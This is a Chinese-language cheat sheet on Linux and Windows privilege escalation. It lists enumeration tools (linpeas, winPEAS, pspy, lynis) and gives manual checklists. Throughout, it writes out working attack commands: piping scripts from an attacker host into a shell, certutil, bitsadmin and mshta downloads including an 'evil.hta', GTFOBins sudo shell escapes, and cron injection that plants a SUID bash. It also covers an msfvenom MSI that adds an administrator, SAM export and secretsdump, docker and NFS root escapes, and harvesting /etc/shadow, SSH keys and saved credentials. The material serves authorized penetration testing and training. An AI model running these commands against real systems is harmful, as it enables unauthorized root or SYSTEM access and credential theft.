# 权限提升(Privilege Escalation)

> **何时读本文件**:已在目标机获得低权限 shell(Linux/Unix 或 Windows),或需要对系统做本地提权面枚举与审计时。

## 快速决策表

| 任务场景 | 首选工具 | 备选 | 关键区别 |
|---|---|---|---|
| Linux 低权限 shell 全面枚举 | linpeas | unix-privesc-check | linpeas 覆盖面最广、按颜色分级;unix-privesc-check 极小、专注文件权限类问题 |
| Windows 低权限 shell 全面枚举 | winPEASx64.exe | 本文件 Windows 手动清单 + PowerUp | winPEAS 一条命令覆盖服务/注册表/令牌;手动清单适合不能落地 EXE 的场景 |
| 疑似 cron/定时任务提权 | pspy | `cat /etc/crontab` + `systemctl list-timers` | pspy 无需 root 就能看到 root 进程的完整命令行 |
| 合规/审计视角的系统检查 | lynis | unix-privesc-check | lynis 产出完整报告与加固建议;unix-privesc-check 只列提权向量 |
| 一次装齐 Linux/Windows/macOS 提权脚本 | peass(apt 包) | 分别从 GitHub release 下载 | apt 单包约 88MB,离线可用 |
| SUID/sudo 命中已知系统二进制 | GTFOBins(载荷库) | — | 直接查现成滥用命令,不必自己构造 |
| Windows 命中系统自带二进制执行/下载需求 | LOLBAS | — | certutil/bitsadmin/mshta 等白名单载荷 |
| 内核或组件版本较旧 | searchsploit(Exploit-DB) | MSF `local_exploit_suggester` | 本地全库检索公开 exploit 并复制利用文件 |

## 提权工作流(方法论)

1. 稳定 shell(Linux):`python3 -c 'import pty; pty.spawn("/bin/bash")'`,再 `export TERM=xterm`(Ctrl+Z 后 `stty raw -echo; fg`)。
2. 自动化枚举:目标机直接跑 linpeas(Linux)或 winPEAS(Windows),拿到全景。
3. 手动核对关键面:见下方两个清单——自动工具可能被 EDR 拦截、输出被截断或漏报,关键项必须手动复核。
4. 每个疑点去对应数据库验证:Linux 二进制 → GTFOBins;Windows 二进制 → LOLBAS;版本漏洞 → Exploit-DB(searchsploit)。
5. 内核 exploit 放在最后尝试:匹配版本精确、先在本地验证,失败常导致目标宕机、丢失立足点。

## 核心工具详解

### linpeas — Linux 本地提权枚举事实标准

**用途**:PEASS 套件的 Linux 枚举 shell 脚本。一次性检查 SUID/SGID、capabilities、sudo 规则、cron、可写文件、内核版本、NFS、容器逃逸面等数百项,以颜色分级输出(红/黄 ≈ 94% 概率是真实提权路径)。
**安装**:`sudo apt install peass`(脚本位于 `/usr/share/peass/linpeas/linpeas.sh`)
**使用场景**:拿到任意低权限 Linux shell 后的第一步;单文件、纯 shell 实现、无依赖,适合传到隔离网络目标执行。

```bash
# Kali 上把脚本投递到目标机
cp /usr/share/peass/linpeas/linpeas.sh . && sudo python3 -m http.server 80

# 目标机:全量检查(-a 含较慢的深度检查),输出落盘
./linpeas.sh -a > linpeas.out 2>&1
less -R linpeas.out                       # -R 保留颜色码便于分级阅读

# 目标机不能落地文件时,管道直接执行
curl http://<kali-ip>/linpeas.sh | sh
wget -qO- http://<kali-ip>/linpeas.sh | sh

# 目标机可出网时,从官方 release 直接执行
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 常用参数:-a 全量检查;-e 额外枚举(执行默认跳过的检查);-s 静默且更快;
# -P <password> 指定 sudo 密码;-w 大块检查间等待;-q 不显示 banner;-N 无颜色输出
# 按类别选检(无排除路径功能,缩小检查面用 -o 指定类别)
./linpeas.sh -o system_information,users_information,software_information,interesting_files
```

**实战要点**:
- 输出极长:先搜红色区段,再看 `/etc/sudoers`、`SUID`、`Capabilities`、`Cron`、`Writable` 各节的黄色项。
- 与 GTFOBins 联动:linpeas 列出的每个 SUID/可 sudo 二进制,都去 GTFOBins 查对应标签。
- 反向 shell 里颜色码会刷屏,务必重定向到文件再用 `less -R` 看。
- linpeas 只枚举不利用;命中项的利用载荷去 GTFOBins/Exploit-DB 取。

### winPEASx64.exe — Windows 本地提权枚举事实标准

**用途**:PEASS 套件的 Windows 枚举器(C# 编译的独立 EXE)。检查服务(不安全权限/未加引号路径)、注册表凭据、AlwaysInstallElevated、令牌特权、已装软件与补丁、计划任务、可写 PATH 目录等。
**安装**:`sudo apt install peass`(位于 `/usr/share/peass/winpeas/winPEASx64.exe`,另有 32 位 winPEASx86.exe)
**使用场景**:Windows 低权限 shell 的第一步;`.exe` 免依赖,`.bat` 版本可在无 exe 执行条件时用。

```bash
# Kali 上投递
cp /usr/share/peass/winpeas/winPEASx64.exe . && sudo python3 -m http.server 80
```

```cmd
:: 目标机:certutil 下载后执行
certutil.exe -urlcache -f http://<kali-ip>/winPEASx64.exe wp.exe
wp.exe

:: 或 PowerShell 下载
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<kali-ip>/winPEASx64.exe','wp.exe')"

:: 重定向到文件时去掉颜色,只看高价值发现
wp.exe quiet notcolor > wp.out

:: 域信息枚举并写日志(网络信息枚举是默认检查项 networkinfo,无需额外参数)
wp.exe domain log=C:\Temp\wp.log
```

**实战要点**:
- 先看 `whoami /priv` 相关小节:SeImpersonate/SeBackup 等特权是最短路径(见 Windows 清单的特权映射表)。
- `wmic os get osarchitecture` 先确认 32/64 位再选 EXE 版本。
- 杀软常标记 winPEAS:被拦时退回本文件的手动清单(全部用系统自带命令)。
- 命中"不安全服务权限/未加引号服务路径"时,配合 `accesschk` 与 `icacls` 手动确认可写性。

### peass — linpeas/winpeas/macpeas 套件包

**用途**:Privilege Escalation Awesome Scripts SUITE 的 Kali 元包,一个 apt 包带走 Linux/Windows/macOS 三个平台的枚举工具(约 88MB)。
**安装**:`sudo apt install peass`
**使用场景**:在 Kali 上离线备齐三种平台的投递载荷,不必逐个去 GitHub 下载。

```bash
# 安装后关键文件位置
/usr/share/peass/linpeas/linpeas.sh
/usr/share/peass/winpeas/winPEASx64.exe
/usr/share/peass/winpeas/winPEASx86.exe

# 从官方 release 拉最新版(目标机可出网时的替代来源)
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe
```

**实战要点**:
- apt 版本随 Kali 滚动更新,落后于 GitHub release;要最新检测规则用 release 直链。
- 88MB 主要是 winPEAS 多架构二进制;只需 linpeas 时单独 `wget` 脚本即可。
- 套件仓库还包含各工具的 README,含输出解读与利用建议。

### pspy — 无 root 监控 Linux 进程与 cron

**用途**:命令行工具,通过轮询 `/proc` 与 inotify 监听,让低权限用户看到其他用户(含 root)实时执行的完整命令行和文件系统事件,不注入任何进程。
**安装**:`sudo apt install pspy`(含 pspy/pspy32/pspy64 静态二进制)
**使用场景**:怀疑 cron/systemd timer/其他用户脚本存在提权点(可写脚本、PATH 劫持、命令行带明文密码)时,先观察再动手。

```bash
# 目标机:常驻运行,实时输出新进程命令行与文件事件
./pspy64

# 后台运行落盘,过一段时间回看
./pspy64 > pspy.log 2>&1 &

# 只看 root 执行的命令(输出行格式:CMD: UID=0  PID=xx  |  <command>)
grep "UID=0" pspy.log

# 完整参数列表
./pspy64 -h
```

**实战要点**:
- 与静态 cron 配置互补:`crontab -l` 看不到 root 的条目时,pspy 能直接捕获执行现场。
- root 脚本调用"不带绝对路径的命令"且该目录可写 → PATH 劫持;pspy 确认执行环境后投递同名恶意文件。
- 备份脚本命令行常带数据库明文密码,是横向/提权的直接凭据来源。
- 输出量大时务必落盘,再按 UID/CMD/时间窗过滤。

### lynis — 系统安全审计(Linux/Unix)

**用途**:审计与加固工具,扫描系统配置并输出系统信息概览、WARNING(安全问题)与 SUGGESTION(加固建议),支持非交互模式做自动化审计。
**安装**:`sudo apt install lynis`
**使用场景**:需要审计视角的报告输出(渗透报告的"系统加固建议"章节),或目标环境只允许温和的配置检查;攻击性枚举优先 linpeas。

```bash
# 官网示例:快速模式(-Q)+ cronjob 格式(非交互、无按键确认)
sudo lynis -Q --cronjob

# 新版子命令风格:完整系统审计
sudo lynis audit system

# 只跑快速测试集,减少耗时
sudo lynis audit system --quick

# 报告与日志位置
sudo grep -E "warning|suggestion" /var/log/lynis-report.dat
sudo lynis show details <test-id>     # 例:SSH-7408
```

**实战要点**:
- root 运行覆盖面远大于普通用户(能读更多文件);普通用户跑会提示跳过多项测试。
- 报告在 `/var/log/lynis-report.dat`,日志在 `/var/log/lynis.log`。
- 对提权有价值的输出:弱文件权限、可写配置、过期内核/组件、无密码账户、错误 sudo 配置。
- `--quick` 跳过深度测试,适合时间受限的快速体检。

### unix-privesc-check — 轻量文件权限提权检查脚本

**用途**:pentestmonkey 出品的单一 shell 脚本,检查文件权限等可能导致本地用户提权或访问本地应用(如数据库)的错误配置,输出中搜 `WARNING` 即问题项。
**安装**:`sudo apt install unix-privesc-check`(仅 85KB)
**使用场景**:目标空间/流量受限装不下 linpeas 时;或作为 linpeas 的第二意见交叉验证文件权限类发现。单脚本、无需解压编译,可直接上传执行。

```bash
# 官网示例:standard 模式
unix-privesc-check standard

# detailed 模式:更多检查项、更慢
unix-privesc-check detailed

# 只看告警行
unix-privesc-check standard | grep -i warning

# 投递到目标机(脚本本体在 Kali 的 /usr/bin/unix-privesc-check)
cp /usr/bin/unix-privesc-check . && sudo python3 -m http.server 80
```

**实战要点**:
- root 运行检查更全(可读更多文件),但以普通用户身份运行的结果才是该用户真实可用的提权面——两种都值得跑。
- 输出没有 linpeas 的颜色分级,检索 `WARNING` 关键字是唯一的问题定位方式。
- 专长是路径权限(可写的脚本、可读的配置、弱 umask),不含内核漏洞与凭据搜索。
- 支持 Solaris/HP-UX/FreeBSD 等非 Linux Unix,是老系统的少数可用选项。

## Linux 提权检查清单(手动命令)

### 1. 内核与系统信息 → 决定是否走内核漏洞

```bash
uname -a                       # 内核版本 + 架构
cat /etc/os-release            # 发行版与版本
ps auxww | head -30            # 关键进程
dpkg -l 2>/dev/null | wc -l    # 软件包规模(决定凭据搜索面)
```

内核/组件版本命中下表时,直接 `searchsploit` 取利用:

| 版本范围 | 漏洞代号 | CVE | 要点 |
|---|---|---|---|
| Linux 2.6.22 – 4.8.3 | Dirty COW | CVE-2016-5195 | 写时复制竞争,可改只读文件(如 /etc/passwd) |
| Linux 5.8 – 5.16.11 / 5.15.25 / 5.10.102 | Dirty Pipe | CVE-2022-0847 | pipe 标志位错误,覆写只读文件 |
| pkexec(polkit)2022-01 补丁前 | PwnKit | CVE-2021-4034 | env 注入,几乎所有发行版预装 |
| glibc ≤ 2.38(2023-10 补丁前) | Looney Tunables | CVE-2023-4911 | GLIBC_TUNABLES 环境变量溢出 |
| sudo 1.8.2–1.8.32p2 / 1.9.0–1.9.5p1 | Baron Samedit | CVE-2021-3156 | 栈溢出,无需交互、无需已知密码 |
| Ubuntu OverlayFS 内核(2023 补丁前) | OverlayFS PE | CVE-2023-2640 + CVE-2023-32229 | 双 CVE 组合,Ubuntu 特有 |

### 2. SUID/SGID 与 capabilities → 对照 GTFOBins

```bash
find / -type f -perm -04000 2>/dev/null        # SUID
find / -type f -perm -02000 2>/dev/null        # SGID
find / -type f -perm -06000 2>/dev/null        # SUID+SGID
getcap -r / 2>/dev/null                        # 文件 capabilities
```

- 每个命中二进制去 GTFOBins 查 "SUID" / "Capabilities" 标签。
- `cap_setuid` 命中(如 perl)可直接:`perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/sh";'`

### 3. sudo 规则 → 最常见的低垂果实

```bash
sudo -l                            # 当前用户可 sudo 执行的命令
sudo -V | head -1                  # sudo 版本(对照 CVE-2021-3156)
cat /etc/sudoers 2>/dev/null
ls -la /etc/sudoers.d/ 2>/dev/null
```

- `(root) NOPASSWD: /usr/bin/<bin>` → GTFOBins "Sudo" 标签取载荷,例如:
  - `sudo find . -exec /bin/sh \; -quit`
  - `sudo vim -c ':!/bin/sh'`
  - `sudo awk 'BEGIN {system("/bin/sh")}'`
  - `sudo less /etc/shadow`(进入后输入 `!sh`)
- 规则为 `(ALL, !root)` 且 sudo < 1.8.28 时可 `sudo -u#-0 <cmd>` 绕过(CVE-2019-14287)。

### 4. cron 与定时任务 → pspy 观察执行现场

```bash
crontab -l 2>/dev/null
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/ /var/spool/cron/crontabs/ 2>/dev/null
systemctl list-timers --all 2>/dev/null
```

- root 的 cron 脚本本身可写 → 直接注入:`echo 'cp /bin/bash /tmp/b && chmod +s /tmp/b' >> <writable-root-script>`
- root 脚本调用不带绝对路径的命令且 PATH 含可写目录 → 放同名恶意文件做 PATH 劫持(`echo $PATH` 确认顺序)。

### 5. 可写文件/目录与挂载

```bash
find / -writable -type f ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null | head -50
find / -writable -type d ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null | head -50
mount | grep -i "no_suid\|nosuid"               # 反查允许 SUID 的挂载
cat /etc/exports                                 # NFS no_root_squash = 即时 root
```

- NFS `no_root_squash` 利用(攻击机侧):`sudo mount -t nfs <ip>:/<share> /mnt/nfs`,以 root 放入 SUID bash,再回目标机执行。

### 6. 用户、组与凭据残留

```bash
id                                   # docker/lxd/disk 组都有对应即时提权
awk -F: '$3==0 {print $1}' /etc/passwd     # 额外 UID=0 用户
ls -la /etc/shadow /etc/passwd              # shadow 对低权限可读本身即提权线索
cat ~/.bash_history /home/*/.bash_history 2>/dev/null | grep -iE "pass|sudo|ssh" | head
find / -name "id_rsa" -o -name "*.pem" -o -name "*.kdbx" 2>/dev/null | head
env | grep -iE "pass|secret|token|key"
```

- docker 组:`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`(chroot 后即 root)。

## Windows 提权检查清单(手动命令)

### 1. 系统信息与补丁水平

```cmd
systeminfo
wmic os get osarchitecture
wmic qfe get Caption,Description,HotFixID,InstalledOn
whoami /all
net user
net localgroup administrators
```

- `systeminfo > sysinfo.txt` 后可用 windows-exploit-suggester(`--systeminfo sysinfo.txt`)比对缺失补丁。
- meterpreter 会话内:`run post/multi/recon/local_exploit_suggester` 自动建议本地提权模块。

### 2. 令牌特权(whoami /priv)→ 特权映射表

| 特权 | 提权路径 |
|---|---|
| SeImpersonatePrivilege | Potato 系列(服务账户 IIS/MSSQL 常见),见下表 |
| SeAssignPrimaryTokenPrivilege | 同样可用 Potato 系列载荷 |
| SeBackupPrivilege | `reg save hklm\sam sam.hiv` + `reg save hklm\system system.hiv` 导出后离线破解 |
| SeRestorePrivilege | 任意覆盖系统文件(替换服务二进制) |
| SeTakeOwnershipPrivilege | 接管任意文件所有权(如替换 utilman.exe) |
| SeLoadDriverPrivilege | 加载已知漏洞驱动(如 Capcom.sys) |
| SeDebugPrivilege | 打开/迁移 SYSTEM 进程,转储 LSASS |

- SeBackup 导出后的离线破解(攻击机):`impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL`

Potato 系列选择(均需 SeImpersonate 类特权):

| 工具 | 适用条件 |
|---|---|
| JuicyPotato | Win10 1809 / Server 2019 之前,且 135 或 5985 端口可用 |
| RoguePotato | 较新系统,需要一台可中继的远程机器 |
| PrintSpoofer | Print Spooler 服务运行中 |
| GodPotato | Win Server 2012–2022 广谱版本 |

### 3. 服务提权面

```cmd
wmic service get name,displayname,pathname,startmode | findstr /vi "windows"
schtasks /query /fo LIST /v | findstr /i "TaskName Run As User"
wmic startup get caption,command
```

- 未加引号且带空格的服务路径 + 上级目录可写 → 放恶意 EXE 劫持服务名。
- 服务二进制/配置可写检测(Sysinternals):`accesschk64.exe /accepteula -uwcqv "Authenticated Users" *`
- 目录 ACL 检查:`icacls "C:\Program Files\<dir>"`(关注 `(F)`/`(M)` 且主体含 Users/Everyone)。

### 4. AlwaysInstallElevated(MSI 以 SYSTEM 安装)

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

- 两处均为 `0x1` 时可利用。攻击机生成 MSI:

```bash
msfvenom -p windows/x64/exec CMD='net localgroup administrators <user> /add' -f msi -o setup.msi
```

```cmd
:: 目标机以 SYSTEM 静默安装
msiexec /quiet /qn /i C:\Temp\setup.msi
```

### 5. 凭据与注册表残留

```cmd
cmdkey /list
runas /savecred /user:<domain>\<user> cmd.exe
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
dir /a C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\
wmic product get name,version
```

- PowerShell 历史文件常含以明文出现的密码;`runas /savecred` 无需密码即可用已存凭据执行任意程序。

## 发现可利用点之后:去哪里查

| 数据库 | 地址 | 何时查 |
|---|---|---|
| GTFOBins | https://gtfobins.github.io | Linux 上 SUID/SGID、sudo、capabilities 命中的合法二进制,取现成滥用载荷 |
| LOLBAS | https://lolbas-project.github.io | Windows 上可执行/下载/持久化的系统自带二进制与脚本 |
| Exploit-DB | 本地 searchsploit(apt 包 exploitdb,Kali 默认已装) | 按内核、sudo/polkit 等组件版本检索公开 exploit |
| PEASS-ng | https://github.com/peass-ng/PEASS-ng | linpeas/winPEAS 最新版与输出解读 |
| Metasploit | `post/multi/recon/local_exploit_suggester` | meterpreter 会话内自动匹配本地提权模块 |

```bash
# searchsploit 典型检索与取用
searchsploit linux kernel 5.4 local privilege escalation
searchsploit sudo 1.8
searchsploit polkit
searchsploit -m <exploit-id>      # 把利用文件复制到当前目录
searchsploit -u                   # 更新漏洞数据库
```

LOLBAS 常用载荷(下载与执行均用系统自带二进制,常用于绕过脚本限制):

```cmd
:: certutil 下载
certutil.exe -urlcache -f http://<ip>/tool.exe tool.exe

:: bitsadmin 下载
bitsadmin /transfer j /download /priority high http://<ip>/x.exe C:\Temp\x.exe

:: mshta 执行远程 hta
mshta.exe http://<ip>/evil.hta

:: InstallUtil 执行恶意 C# 程序(/U 走卸载构造器)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U evil.exe
```

## 其余工具速查

| 工具 | 一句话用途 | 安装包 | 最常用命令 |
|---|---|---|---|
| pspy-binaries | pspy 的预编译二进制集(与 pspy 同包,含 pspy32/pspy64 等多架构版本) | pspy | `./pspy64 > pspy.log 2>&1 &` |

---

本文档仅用于已获得书面授权的渗透测试、CTF 竞赛与安全教育场景。
